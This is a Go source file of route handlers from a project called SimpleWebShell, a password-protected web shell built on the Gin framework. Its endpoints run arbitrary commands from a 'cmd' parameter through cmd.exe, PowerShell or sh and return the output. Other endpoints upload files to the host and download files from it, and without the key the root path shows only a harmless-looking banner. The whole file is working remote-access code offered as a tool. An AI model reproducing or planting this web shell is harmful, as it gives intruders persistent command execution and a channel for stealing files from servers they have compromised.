package route

import (
	"SimpleWebShell/pages"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"os/exec"

	"github.com/gin-gonic/gin"
)

// 处理根路径
func handleRoot(c *gin.Context) {
	// 检查密钥
	key := c.Query("key")
	if key != password {
		// 密钥不正确，只显示基本信息
		c.String(http.StatusOK, "SimpleWebshell 1.1.20225 By FasterEdge")
		return
	}

	// 密钥正确，显示WebShell界面
	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(http.StatusOK, pages.GetWebShellHTML())
}

// 处理GET请求执行shell命令
func handleGet(c *gin.Context) {
	// 验证密钥
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	// 获取命令并进行URL解码
	cmdEncoded := c.Query("cmd")
	if cmdEncoded == "" {
		c.String(http.StatusBadRequest, "缺少cmd参数")
		return
	}

	// URL解码命令参数
	cmd, err := url.QueryUnescape(cmdEncoded)
	if err != nil {
		c.String(http.StatusBadRequest, fmt.Sprintf("命令参数解码错误: %v", err))
		return
	}

	// 执行命令
	result, err := executeCommand(cmd)
	if err != nil {
		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v", err))
		return
	}

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, result)
}

// 处理POST请求执行shell命令
func handlePost(c *gin.Context) {
	// 检查Content-Type
	contentType := c.GetHeader("Content-Type")

	var key, cmd string

	if strings.Contains(contentType, "application/json") {
		// 处理JSON格式
		var jsonData struct {
			Key string `json:"key"`
			Cmd string `json:"cmd"`
		}

		if err := c.ShouldBindJSON(&jsonData); err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("JSON解析错误: %v", err))
			return
		}

		key = jsonData.Key
		cmd = jsonData.Cmd
	} else {
		// 处理表单格式（向后兼容）
		key = c.PostForm("key")
		cmd = c.PostForm("cmd")
	}

	// 验证密钥
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	// 获取命令
	if cmd == "" {
		c.String(http.StatusBadRequest, "缺少cmd参数")
		return
	}

	// 执行命令
	result, err := executeCommand(cmd)
	if err != nil {
		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v", err))
		return
	}

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, result)
}

// 处理文件上传
// 上传使用 multipart/form-data，key 可以放在 query 或 form field 中（优先检查 query）
func handleFileSend(c *gin.Context) {
	// 优先从 query 获取 key
	key := c.Query("key")
	if key != password {
		// 如果 query 中没有或不匹配，尝试从 form 字段中读取（兼容 multipart/form-data）
		// 使用 c.Request.MultipartReader 读取表单字段，但为了简单起见，如果 query 不存在则返回 Unauthorized
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	// 获取 multipart reader 以流式处理上传，避免内存限制
	mr, err := c.Request.MultipartReader()
	if err != nil {
		c.String(http.StatusBadRequest, fmt.Sprintf("解析 multipart 数据失败: %v", err))
		return
	}

	ctx := c.Request.Context()
	var savedFiles []string
	defer func() {
		// 在处理完毕若发生 panic/错误，清理已写入的临时文件（如果需要）
		if r := recover(); r != nil {
			for _, f := range savedFiles {
				_ = os.Remove(f)
			}
			c.String(http.StatusInternalServerError, fmt.Sprintf("上传处理发生异常: %v", r))
		}
	}()

	// 只处理第一个文件字段（常见场景），如果需要支持多个文件可循环处理
	for {
		part, perr := mr.NextPart()
		if perr == io.EOF {
			break
		}
		if perr != nil {
			// 读取错误
			for _, f := range savedFiles {
				_ = os.Remove(f)
			}
			c.String(http.StatusInternalServerError, fmt.Sprintf("读取 multipart 部分失败: %v", perr))
			return
		}

		if part.FileName() == "" {
			// 普通表单字段，忽略（key 我们已通过 query 校验）
			_ = part.Close()
			continue
		}

		// 文件字段
		filename := filepath.Base(part.FileName())
		// 将文件保存在当前工作目录下，保留原始文件名（可按需修改为特定目录）
		outPath := filename
		outFile, ferr := os.Create(outPath)
		if ferr != nil {
			_ = part.Close()
			for _, f := range savedFiles {
				_ = os.Remove(f)
			}
			c.String(http.StatusInternalServerError, fmt.Sprintf("创建文件失败: %v", ferr))
			return
		}

		savedFiles = append(savedFiles, outPath)

		// 流式拷贝，支持取消
		buf := make([]byte, 32*1024)
		for {
			// 检查客户端是否已经取消
			select {
			case <-ctx.Done():
				// 取消，关闭文件并删除部分写入的文件
				_ = outFile.Close()
				_ = os.Remove(outPath)
				c.String(http.StatusRequestTimeout, "上传已取消")
				return
			default:
			}

			n, rerr := part.Read(buf)
			if n > 0 {
				if _, werr := outFile.Write(buf[:n]); werr != nil {
					_ = outFile.Close()
					_ = os.Remove(outPath)
					c.String(http.StatusInternalServerError, fmt.Sprintf("写入文件失败: %v", werr))
					return
				}
			}
			if rerr != nil {
				if rerr == io.EOF {
					break
				}
				_ = outFile.Close()
				_ = os.Remove(outPath)
				c.String(http.StatusInternalServerError, fmt.Sprintf("读取上传数据失败: %v", rerr))
				return
			}
		}

		_ = outFile.Close()
		// 仅处理第一个文件（如果有多个文件部分，可继续循环）
		break
	}

	// 上传完成
	c.Header("Content-Type", "application/json; charset=utf-8")
	c.String(http.StatusOK, fmt.Sprintf(`{"status":"ok","files":%q,"message":"上传完成"}`, savedFiles))
}

// 处理文件下载
// 请求示例: /file_receive?key=xxx&path=filename
func handleFileReceive(c *gin.Context) {
	// 验证密钥
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	filePath := c.Query("path")
	if filePath == "" {
		c.String(http.StatusBadRequest, "缺少path参数")
		return
	}

	// 安全处理: 只使用文件名，禁止目录遍历
	filePath = filepath.Base(filePath)

	// 打开文件
	f, err := os.Open(filePath)
	if err != nil {
		c.String(http.StatusNotFound, fmt.Sprintf("打开文件失败: %v", err))
		return
	}
	defer func() { _ = f.Close() }()

	// 获取文件信息
	fi, err := f.Stat()
	if err != nil {
		c.String(http.StatusInternalServerError, fmt.Sprintf("获取文件信息失败: %v", err))
		return
	}

	// 设置头
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", fi.Name()))
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Length", fmt.Sprintf("%d", fi.Size()))
	c.Header("Last-Modified", fi.ModTime().UTC().Format(http.TimeFormat))

	// 支持客户端取消
	ctx := c.Request.Context()
	buf := make([]byte, 32*1024)
	for {
		select {
		case <-ctx.Done():
			// 客户端取消
			return
		default:
		}

		n, rerr := f.Read(buf)
		if n > 0 {
			if _, werr := c.Writer.Write(buf[:n]); werr != nil {
				return
			}
			// 刷新，使数据尽快发送
			if flusher, ok := c.Writer.(http.Flusher); ok {
				flusher.Flush()
			}
		}
		if rerr != nil {
			if rerr == io.EOF {
				break
			}
			// 读取错误
			return
		}
	}

	// 下载完成，简单记录时间（或返回日志）
	_ = time.Now()
}

// 执行shell命令
func executeCommand(cmdStr string) (string, error) {
	var cmd *exec.Cmd

	// 根据shell类型使用不同的参数
	shellLower := strings.ToLower(shellPath)
	if strings.Contains(shellLower, "cmd") || strings.Contains(shellLower, "cmd.exe") {
		// Windows CMD 使用 /c 参数
		cmd = exec.Command(shellPath, "/c", cmdStr)
	} else if strings.Contains(shellLower, "powershell") || strings.Contains(shellLower, "pwsh") {
		// PowerShell 使用 -Command 参数
		cmd = exec.Command(shellPath, "-Command", cmdStr)
	} else { // 默认假设为类Unix shell
		// Linux/Unix shells (bash, sh, zsh等) 使用 -c 参数
		cmd = exec.Command(shellPath, "-c", cmdStr)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}
	return string(output), nil
}
